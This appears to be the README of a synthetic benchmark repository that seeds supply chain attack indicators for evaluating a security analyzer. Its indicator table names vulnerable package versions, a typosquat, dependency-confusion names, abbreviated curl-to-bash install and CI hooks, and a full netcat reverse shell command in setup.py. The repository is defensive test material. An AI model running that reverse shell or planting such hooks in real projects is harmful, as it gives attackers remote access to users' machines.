# Synthetic Supply Chain Security Benchmark Repository

This repository contains a comprehensive suite of **planted supply chain attack indicators and vulnerabilities** designed for automated evaluation of **PS14: Software Supply Chain Security Analyzer**.

---

## Planted Attack Signals Matrix

| Capability | Attack Vector | Planted File | Exact Indicator |
|---|---|---|---|
| **1. Known Vulnerabilities** | Known CVEs / Advisories | `package.json` | `express@4.17.1` (GHSA-rv95-896h-c2vc), `lodash@4.17.20` (GHSA-29mw-wpgm-hmr9) |
| **2. Multi-Hop Transitives** | Transitive Dependency Chain | `package-lock.json` | `express -> qs@6.5.2` (Prototype Pollution in sub-dependency) |
| **3. Insecure Integrity** | Plaintext HTTP Registry URL | `package-lock.json` | `http://registry.npmjs.org/qs/-/qs-6.5.2.tgz` (MitM susceptibility) |
| **4. Typosquatting** | Lexical Lookalike Package | `package.json` | `expreess` (Edit distance 1 to `express`, 93% similarity) |
| **5. Dependency Confusion** | Internal Namespace Collision | `package.json` | `internal-auth-service`, `company-payments-sdk` |
| **6. Suspicious Lifecycle Hooks** | Malicious Install Hooks | `package.json` | `"postinstall": "node -e require('child_process')..."`<br>`"prepare": "curl ... \| bash"` |
| **7. CI/CD Workflow Poisoning** | Unpinned Actions & Permissions | `.github/workflows/ci.yml` | `uses: actions/checkout@master` (Unpinned mutable ref)<br>`permissions: write-all` (Excessive token scope)<br>`run: curl ... \| bash` (Untrusted pipe) |
| **8. Python AST Backdoor** | Static Process Execution | `setup.py` | `os.system("nc -e /bin/sh 10.10.14.5 4444")` (Reverse shell hook) |
| **9. Package Reputation** | Version Spike Anomaly | `requirements.txt` | `internal-vault==99.0.0` (Abnormally high major version spike) |

---

## How Evaluators Can Test This Benchmark

### Option A: Standalone CLI
```bash
# Scan repository and print terminal table
python -m backend.cli ./demo-repository

# Scan and export CycloneDX SBOM + SARIF report
python -m backend.cli ./demo-repository --sbom sbom.cdx.json --sarif results.sarif

# Enforce CI/CD Quality Gate (exits with code 1 due to P0/Critical findings)
python -m backend.cli ./demo-repository --gate
```

### Option B: REST API
```bash
# Scan local repository via API
curl -X POST http://127.0.0.1:8000/api/v1/scans \
  -H "Content-Type: application/json" \
  -d '{"repo_url": "demo-repository"}'
```
